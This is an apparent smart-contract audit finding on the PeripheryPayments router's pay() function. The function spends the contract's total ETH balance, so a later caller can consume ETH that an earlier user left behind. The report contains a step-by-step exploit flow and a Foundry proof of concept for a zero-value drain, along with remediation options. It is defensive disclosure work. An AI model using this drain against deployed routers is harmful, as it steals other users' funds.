Audit Report

## Title
Stale Router ETH Balance Consumed by Subsequent Caller Without Source Verification — (`File: metric-periphery/contracts/base/PeripheryPayments.sol`)

## Summary
The `pay` function in `PeripheryPayments.sol` uses `address(this).balance` — the router's total ETH balance — when settling a WETH-input swap, rather than restricting spending to the ETH contributed by the current call's `msg.value`. Because `exactInputSingle` and `exactInput` are `payable` with no enforcement that `msg.value` equals `amountIn`, and because `refundETH` is optional, excess ETH from a prior caller can accumulate in the router and be silently consumed by any subsequent caller who specifies WETH as `tokenIn` with `msg.value = 0`.

## Finding Description
In `PeripheryPayments.pay` (lines 73–84), the WETH branch reads:

```solidity
uint256 nativeBalance = address(this).balance;   // total router ETH, not msg.value
if (nativeBalance >= value) {
    IWETH9(WETH).deposit{value: value}();
    IERC20(WETH).safeTransfer(recipient, value);
} else if (nativeBalance > 0) {
    IWETH9(WETH).deposit{value: nativeBalance}();
    IERC20(WETH).safeTransfer(recipient, nativeBalance);
    IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
} else {
    IERC20(WETH).safeTransferFrom(payer, recipient, value);
}
```

`address(this).balance` is the router's cumulative ETH balance across all callers, not the ETH contributed by the current transaction. ETH accumulates whenever a user calls a `payable` entry point (e.g., `exactInputSingle` at line 67, `exactInput` at line 92, `multicall` at line 39) with `msg.value` exceeding `amountIn` and does not call `refundETH` in the same transaction.

The `receive()` guard (lines 32–34) only reverts direct ETH sends from non-WETH addresses; it does not prevent ETH from accumulating via `msg.value` on payable swap functions. `refundETH` (lines 58–63) is an opt-in call with no automatic invocation.

**Exploit flow:**
1. Victim calls `exactInputSingle{value: 1000}` with `amountIn: 500` and `tokenIn: WETH`. The swap callback triggers `pay(WETH, victim, pool, 500)`. Since `address(this).balance == 1000 >= 500`, the router deposits 500 ETH as WETH and sends it to the pool. The remaining 500 ETH stays in the router. Victim does not call `refundETH`.
2. Attacker calls `exactInputSingle{value: 0}` with `amountIn: 500` and `tokenIn: WETH`. The swap callback triggers `pay(WETH, attacker, pool, 500)`. Since `address(this).balance == 500 >= 500`, the router deposits the victim's stranded 500 ETH as WETH and sends it to the pool. The attacker receives the full swap output (token1) while contributing zero ETH or WETH.

No privileged access is required. The attacker only needs to monitor the router's on-chain ETH balance.

## Impact Explanation
Direct loss of user principal. Any ETH stranded in the router is freely claimable by any subsequent caller specifying WETH as `tokenIn`. The victim loses their entire stranded ETH balance; the attacker receives the corresponding swap output for free. This satisfies the Critical/High direct loss of user principal threshold under Sherlock contest rules.

## Likelihood Explanation
ETH stranding is a common, realistic pattern: any user who calls `exactInputSingle{value: X}` with `amountIn < X` and omits a trailing `refundETH`, or who uses `multicall` without a `refundETH` sub-call, will strand ETH. An attacker can monitor the router's ETH balance via a public RPC call and drain it in a single transaction with no special permissions, capital, or timing constraints. The attack is repeatable and fully automated.

## Recommendation
Restrict `pay` to spending only the ETH contributed by the current call. Options:
- Pass `msg.value` explicitly from each payable entry point down to `pay` and use it as the upper bound on ETH spending.
- Automatically call `refundETH` (or an internal equivalent) at the end of every payable entry point (`exactInputSingle`, `exactInput`, `exactOutputSingle`, `exactOutput`, `multicall`) to ensure no ETH is ever left in the router between transactions.
- Track the router's ETH balance before and after each payable call and revert if the post-call balance exceeds the pre-call balance minus `msg.value`.

## Proof of Concept
```solidity
// Setup: pool(WETH, token1) exists and is seeded with liquidity.

// Step 1 – Victim strands ETH in the router
vm.prank(victim);
router.exactInputSingle{value: 1000}(
    ExactInputSingleParams({
        pool: address(pool), tokenIn: address(weth), tokenOut: address(token1),
        zeroForOne: true, amountIn: 500, amountOutMinimum: 0,
        recipient: victim, deadline: block.timestamp + 1, priceLimitX64: 0, extensionData: ""
    })
);
assertEq(address(router).balance, 500); // 500 ETH stranded

// Step 2 – Attacker drains stranded ETH via a zero-value swap
uint256 attackerToken1Before = token1.balanceOf(attacker);
vm.prank(attacker);
router.exactInputSingle{value: 0}(    // attacker sends NO ETH
    ExactInputSingleParams({
        pool: address(pool), tokenIn: address(weth), tokenOut: address(token1),
        zeroForOne: true, amountIn: 500, amountOutMinimum: 0,
        recipient: attacker, deadline: block.timestamp + 1, priceLimitX64: 0, extensionData: ""
    })
);
assertEq(address(router).balance, 0);                       // router drained
assertGt(token1.balanceOf(attacker), attackerToken1Before); // attacker received token1 for free
```
